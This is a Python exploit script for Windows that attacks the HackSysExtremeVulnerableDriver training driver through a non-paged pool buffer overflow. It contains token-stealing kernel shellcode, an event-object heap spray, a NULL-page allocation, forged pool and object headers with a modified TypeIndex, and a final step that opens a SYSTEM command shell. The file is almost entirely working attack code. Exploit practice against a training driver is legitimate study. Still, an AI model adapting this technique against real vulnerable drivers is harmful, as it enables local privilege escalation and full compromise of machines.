# -*- coding: utf-8 -*-
import sys
import random
import binascii
import struct
import os
import subprocess
import ctypes 
import json 

from ctypes import *
from ctypes.wintypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi
advapi32 = windll.advapi32

def debug_print(message):
    """ debug_debug_prints message in terminal and debugger """

    print(message)
    return kernel32.OutputDebugStringA(message + "\n")


def getLastError():
    """ Format GetLastError """
    
    buf = create_string_buffer(2048)
    if kernel32.FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL,
            kernel32.GetLastError(), 0,
            buf, sizeof(buf), NULL):
        debug_print("\n[-] ERR:  " + str(buf.value))
    else:
        debug_print("Unknown Error")


def hexdump(ptr, num):
    """
    Hexdump memory region - DEBUG
    0000 | 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  | .ELF............
    0010 | 03 00 3e 00 01 00 00 00 10 42 0d 00 00 00 00 00  | ..>......B......
    0020 | 40 00 00 00 00 00 00 00 38 4c 39 00 00 00 00 00  | @.......8.9.....
    0030 | 00 00 00 00 40 00 38 00 09 00 40 00 1e 00 1d 00  | ....@.8...@.....
    0040 | 06 00 00 00 05 00 00 00 40 00 00 00 00 00 00 00  | ........@.......
    0050 | 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  | @.......@.......
    0060 | 08 01 00 00 00 00 00 00 08 01 00 00 00 00 00 00  | ................
    0070 | 08 00 00 00 00 00 00 00 03 00 00 00 04 00 00 00  | ................
    """

    s = ''
    n = 0
    lines = []
    data = list((num * ctypes.c_byte).from_address(ptr))

    if len(data) == 0:
        return '<empty>'

    for i in range(0, num, 16):
        line = ''
        line += '%04x | ' % (i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % abs(data[j])

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)

    return '\n'.join(lines)
    

def _ret_shellcode_buffer():
    """ Payload memory allocation in user-land """

    shellcode = bytearray(
        #---[Debug]
        #"\xCC"
        #---[Setup]
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00" 	    # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00" 	    # mov ebx, [eax + TOKEN_OFFSET]
        #---[Copy System PID token]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET] <-|
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET           |
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx     |
        "\x75\xED"                      # jnz                           ->|
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        #---[Recover]
        "\x61"                          # popad
        "\xC2\x10\x00"                  # ret 10
    )

    MEM_COMMIT_MEM_RESERVE = 0x3000
    PAGE_EXECUTE_READWRITE = 0x40
	
    ptr = kernel32.VirtualAlloc(
        c_int(0),                       # lpAddress
        c_int(len(shellcode)),          # dwSize
        c_int(MEM_COMMIT_MEM_RESERVE),  # flAllocationType
        c_int(PAGE_EXECUTE_READWRITE)   # flProtect
    )
    
    shellcode_ptr = (c_char * len(shellcode)).from_buffer(shellcode)

    kernel32.RtlMoveMemory(
        c_int(ptr),
        shellcode_ptr,
        c_int(len(shellcode))
    )
        
    return ptr, len(shellcode)


def _send_payload(payload_ptr, payload_len, code):
    """ Interacting with the driver """
    
    FILE_DEVICE_UNKNOWN = 0x22
    FILE_ANY_ACCESS = 0
    METHOD_NEITHER = 3

    # Recreate CTL_CODE macro to generate driver IOCTL 
    """
    ctl_code = hex(
        (FILE_DEVICE_UNKNOWN << 16) |
        (FILE_ANY_ACCESS << 14) | 
        (code << 2) | 
        METHOD_NEITHER
    )
    """

    ctl_code = code # direct_input

    # Create handle to driver """
    handle = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
        0xC0000000,              # dwDesiredAccess
        0,                       # dwShareMode
        None,                    # lpSecurityAttributes
        0x3,                     # dwCreationDisposition
        0,                       # dwFlagsAndAttributes
        None                     # hTemplateFile
    )

    IO_CTL = kernel32.DeviceIoControl(
        handle,             # hDevice
        ctl_code,           # dwIoControlCode
        payload_ptr,        # lpInBuffer
        c_int(payload_len), # nInBufferSize
        None,               # lpOutBuffer
        0,                  # nOutBufferSize
        byref(c_ulong()),   # lpBytesReturned
        None                # lpOverlapped
    )
    
    return kernel32.CloseHandle(handle)
    

def _heap_spray():
    """ Create Threads for Heap Spraying technique """
    create_event_array_1 = []
    create_event_array_2 = []
    debug_print("[*] Allocating [15000] CreateEventA Objects")
    for i in range(10000):
       create_event_array_1.append(kernel32.CreateEventA(None, False, False, None))

    for i in range(5000):
       create_event_array_2.append(kernel32.CreateEventA(None, False, False, None))

    debug_print("[*] Freeing Objects in order to create non-paged pools holes")
    for x in range (0,5000,16):
        for y in range (8):
	    kernel32.CloseHandle(create_event_array_2[ x + y ])
	    
    return create_event_array_2


def NtAllocateVirtualMemory(shellcode_ptr, shellcode_len):
    """ Allocate shellcode address into current process [0x00000074] address, in order to trigger EIP overflow """
    MEM_COMMIT_MEM_RESERVE = 0x3000
    PAGE_EXECUTE_READWRITE = 0x40 
    
    nt_result = ntdll.NtAllocateVirtualMemory(
        kernel32.GetCurrentProcess(),   # ProcessHandle
        byref(c_void_p(0x1)),           # *BaseAddress
        0,                              # ZeroBits
        byref(c_int(shellcode_len)),    # RegionSize
        MEM_COMMIT_MEM_RESERVE,         # AllocationType
        PAGE_EXECUTE_READWRITE          # Protect
    )
    
    csrc = create_string_buffer("\x00" * 0x70 + struct.pack("<I", shellcode_ptr), 0x00000074)
    memmove_result = memmove(0x4, addressof(csrc), 0x00000074)

    return True

def _exploit(code):
    """ Execute exploit in order to get nt-authority/SYSTEM shell """
    shellcode_ptr, shellcode_len = _ret_shellcode_buffer() # shellcode virtual allocation

    debug_print("\n[*] User-land shellcode allocated at: [0x%x]\n" % shellcode_ptr)
    debug_print(hexdump(shellcode_ptr, 32))

    create_event_array_2 = _heap_spray() # [CreateEventA] heap spraying 
    NtAllocateVirtualMemory(shellcode_ptr, shellcode_len) # 0x00000074 (Shellcode_PTR)

    payload = "\x41" * 0x1f8
    # nt!_POOL_HEADER
    """
    1: kd> dt nt!_POOL_HEADER 861a3c80 
    +0x000 PreviousSize     : 0y001000000 (0x40)
    +0x000 PoolIndex        : 0y0000000 (0)
    +0x002 BlockSize        : 0y000001000 (0x8)
    +0x002 PoolType         : 0y0000010 (0x2)
    +0x000 Ulong1           : 0x4080040
    +0x004 PoolTag          : 0xee657645
    +0x004 AllocatorBackTraceIndex : 0x7645
    +0x006 PoolTagHash      : 0xee65
    """
    payload += struct.pack("<L", 0x4080040)  # Ulong1 
    payload += struct.pack("<L", 0xee657645) # POOL TAG (Event)

    # nt!_OBJECT_HEADER_QUOTA_INFO
    """
    0: kd> dt nt!_OBJECT_HEADER_QUOTA_INFO 861a3c80+8
    +0x000 PagedPoolCharge  : 0
    +0x004 NonPagedPoolCharge : 0x40
    +0x008 SecurityDescriptorCharge : 0
    +0x00c SecurityDescriptorQuotaBlock : (null) 
    """
    payload += struct.pack("<L", 0x00) # PagedPoolCharge
    payload += struct.pack("<L", 0x40) # NonPagedPoolCharge
    payload += struct.pack("<L", 0x00) # SecurityDescriptorCharge
    payload += struct.pack("<L", 0x00) # SecurityDescriptorQuotaBlock

    # nt!_OBJECT_HEADER
    """
    0: kd> dt nt!_OBJECT_HEADER 861a3c80+8+10
    +0x000 PointerCount     : 0n1
    +0x004 HandleCount      : 0n1
    +0x004 NextToFree       : 0x00000001 Void
    +0x008 Lock             : _EX_PUSH_LOCK
    +0x00c TypeIndex        : 0xc ''
    +0x00d TraceFlags       : 0 ''
    +0x00e InfoMask         : 0x8 ''
    +0x00f Flags            : 0 ''
    +0x010 ObjectCreateInfo : 0x86d01940 _OBJECT_CREATE_INFORMATION
    +0x010 QuotaBlockCharged : 0x86d01940 Void
    +0x014 SecurityDescriptor : (null)
    +0x018 Body             : _QUAD
    """
    payload += struct.pack("<L", 0x01) # PointerCount
    payload += struct.pack("<L", 0x01) # HandleCount / NextToFree
    payload += struct.pack("<L", 0x00) # Lock
    payload += "\x00" # TypeIndex (MODIFIED 0xc => 0x00)
    payload += "\x00" # TraceFlags
    payload += "\x08" # InfoMask
    payload += "\x00" # Flags

    payload_ptr = id(payload) + 0x14
    payload_len = len(payload)
    
    # send custom payload
    _send_payload(
        payload_ptr,
        payload_len,
        code
    )

    debug_print("[*] Freeing Dummy Pools to prevent [NON_PAGED_POOL] crashes")
    for i in create_event_array_2:
        kernel32.CloseHandle(i)
        
    debug_print("[+] Exploit Payload Sent!")
    debug_print("[!] Getting nt-authority/SYSTEM impersonated process shell...")
    
    os.system("cmd.exe /K") # get SYSTEM shell

if __name__ == "__main__":
    # code = 0x22204b # BufferOverflow NON-PAGED POOL NX
    code = 0x22200f # BufferOverflow NON-PAGED POOL
    _exploit(code)
